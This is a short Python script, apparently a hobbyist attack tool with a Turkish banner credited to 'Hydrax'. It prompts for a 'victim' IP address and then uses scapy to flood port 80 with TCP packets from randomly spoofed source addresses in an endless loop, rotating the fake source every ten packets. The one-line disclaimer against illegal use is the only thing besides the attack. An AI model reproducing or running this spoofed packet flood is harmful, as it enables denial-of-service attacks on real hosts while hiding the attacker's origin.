print ("Bu program BozkurtX için tasarlanmıştır yasadışı kullanım yasak")
print("""
	dbdbbd      dbbddb    dbbdbdb  db  dbdb                dbdbdbdb   dbdbdbdb  db         db
	db   db   db     db       db   db db     db         db  db     db     db      db      db
	dbdbdb    db     db      db    dbd       db         db  db    db      db        db   db
	db        db     db     db     dbd       db         db  db  db        db         db db    
	dbdbdb    db     db    db      db db     db         db  dbdb          db       db    db
	db   db   db     db   db       db  db    db         db  db db         db     db        db
   	dbdbdb      dbdbdb    dbdbdbdb db    dbdb  dbdbdbdbd    db   dbdb     db   db            bd
   	- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - -- - - - - - - - -- - - - - - 
     -- - - - -- - - - - - -- - - - -  - -- - - - - - -- - - - - - - - - - - - - - - -- - - - - - - - - - - -
                                   Tasarlayan:Hydrax
 """)
print ("youtube:https://studio.youtube.com/channel/UC-0OiCnr2tM4U8oJNhscYLw/editing/images")
import random
from scapy.all import *
targetIP = input("Kurbanın IP adresi: ")
i=1
 
def get_randomSourceIP():
	a = str(random.randint(1,254)) #  a.b.c.d (for instance: a.168.1.1)
	b = str(random.randint(1,254)) # (192.b.c.d)
	c = str(random.randint(1,254)) # (192.168.c.d)
	d = str(random.randint(1,254)) # (192.168.1.d) -> 192.168.1.1
	dot = "."
	src = a+dot+b+dot+c+dot+d
	return src
 
while 1: 
	source=get_randomSourceIP()
	
	print (source)
 
	startPort = random.randint(1,1000) 
	endPort = random.randint(1000,65535)
	loop_exit = 0
	for srcport in range(startPort,endPort): #srcport named for start-end port numbers
		IP1 = IP(src=source, dst=targetIP)
		TCP1 = TCP(sport=srcport, dport=80)
		packet = IP1 / TCP1
		send(packet,inter= .0001) #to send packet 
		print ("Kurbana paketler yollanıyor ", i)
		loop_exit = loop_exit+1
		i=i+1
		if loop_exit ==10 : # Each Source IP randomly changes for every 10 steps
			break 
